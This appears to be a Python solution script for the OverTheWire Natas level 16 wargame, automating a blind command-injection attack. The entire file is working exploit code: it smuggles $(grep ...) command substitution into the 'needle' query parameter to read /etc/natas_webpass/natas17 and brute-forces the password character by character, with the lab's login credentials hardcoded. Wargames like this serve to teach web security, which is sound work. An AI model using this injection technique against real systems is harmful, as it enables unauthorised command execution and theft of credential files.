# Overthewire: Natas 16
# woanmeo11

import requests
from string import ascii_letters, digits


account = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
url = 'http://natas16.natas.labs.overthewire.org/'

chars = ascii_letters + digits
filtered = ''
password = ''

for c in chars:
    payload = f'?needle=doomed$(grep {c} /etc/natas_webpass/natas17)'
    r = requests.get(url + payload, auth=account)
    if 'doomed' not in r.text:
        filtered += c
        print(filtered)

for i in range(32):
    for c in filtered:
        payload = f'?needle=doomed$(grep ^{password + c} /etc/natas_webpass/natas17)'
        r = requests.get(url + payload, auth=account)
        if 'doomed' not in r.text:
            password += c
            print(password)
            break
